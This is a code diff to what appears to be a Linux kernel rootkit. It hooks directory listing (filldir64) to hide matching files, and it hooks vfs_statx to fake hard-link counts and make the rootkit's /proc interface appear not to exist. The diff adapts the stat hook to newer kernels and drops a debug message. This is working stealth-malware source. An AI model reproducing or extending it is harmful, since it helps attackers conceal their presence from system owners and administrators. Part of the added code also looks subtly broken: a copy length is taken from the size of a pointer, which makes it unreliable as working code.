@@ -757,12 +757,7 @@ static int m_filldir64(struct dir_context *ctx, const char *name, int namlen,lof
 
     if (fs_search_name(name, ino))
         return 0;
-
     return real_filldir64(ctx, name, namlen, offset, ino, d_type);
-
-match:
-    prinfo("Hiding '%s' from ino=%llu\n", name, ino);
-    return 0;
 }
 
 #define MAXKEY 512
@@ -1009,10 +1004,18 @@ static __always_inline struct pt_regs *ftrace_get_regs(struct ftrace_regs *fregs
 }
 #endif
 
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
 static long (*real_vfs_statx)(int, const char __user *, int, struct kstat *, u32);
 static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct kstat *stat, u32 request_mask) {
-    /** XXX do I need this much */
-    char kernbuf[PROCNAME_MAXLEN+6] = {0};
+#else
+static long (*real_vfs_statx)(int, struct filename  *, int, struct kstat *, u32);
+static long m_vfs_statx(int dfd, struct filename *filename, int flags, struct kstat *stat, u32 request_mask) {
+#endif
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+    char *name = kzalloc(PROCNAME_MAXLEN, GFP_KERNEL);
+#else
+    char *name = filename ? filename->name : "";
+#endif
 
     /* call original first, I want stat */
     long rv = real_vfs_statx(dfd, filename, flags, stat, request_mask);
@@ -1022,20 +1025,28 @@ static long m_vfs_statx(int dfd, const char __user *filename, int flags, struct 
      *      and update hard-links counter accordingly.
      *  2   make stat fail for /proc interface.
      * */
-    if (!copy_from_user((void*)kernbuf, filename, sizeof(kernbuf)-1)) {
-        if (strlen(kernbuf) > 0 && S_ISDIR(stat->mode)) {
-            int count = fs_is_dir_inode_hidden((const char *)kernbuf, stat->ino);
+
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
+    if (!name) goto leave;
+    if (!copy_from_user((void*)name, filename, sizeof(name)-1)) {
+#endif
+        if (strlen(name) > 0 && S_ISDIR(stat->mode)) {
+            int count = fs_is_dir_inode_hidden((const char *)name, stat->ino);
             if (count > 0) {
                 prinfo("%s: file match ino=%llu nlink=%d count=%d\n", __func__, stat->ino, stat->nlink, count);
 
                 /* Hit(s) -> decrement hard-link counts */
                 stat->nlink -= count;
             }
-        } else if (strstr(kernbuf, PROCNAME)) {
-            /* Mauro? */
+        } else if (strstr(name, PROCNAME)) {
             rv = -ENOENT;
         }
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,18,0)
     }
+    if (name)
+        kfree(name);
+leave:
+#endif
     return rv;
 }
 
